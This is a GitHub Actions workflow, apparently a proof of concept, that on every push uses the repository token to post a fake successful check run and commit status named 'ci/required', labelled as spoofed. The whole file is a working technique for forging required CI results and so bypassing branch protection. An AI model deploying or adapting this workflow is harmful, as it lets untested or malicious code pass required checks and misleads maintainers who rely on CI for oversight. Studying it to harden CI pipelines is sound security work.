name: spoof
on: push
permissions:
  checks: write
  statuses: write
jobs:
  spoof:
    runs-on: ubuntu-latest
    steps:
      - name: post check run and status
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          curl -s -X POST -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json"             "https://api.github.com/repos/${{ github.repository }}/check-runs"             -d "{\"name\":\"ci/required\",\"head_sha\":\"${{ github.sha }}\",\"status\":\"completed\",\"conclusion\":\"success\",\"output\":{\"title\":\"spoofed\",\"summary\":\"spoofed by branch workflow\"}}"
          curl -s -X POST -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json"             "https://api.github.com/repos/${{ github.repository }}/statuses/${{ github.sha }}"             -d "{\"state\":\"success\",\"context\":\"ci/required\",\"description\":\"spoofed status\"}"
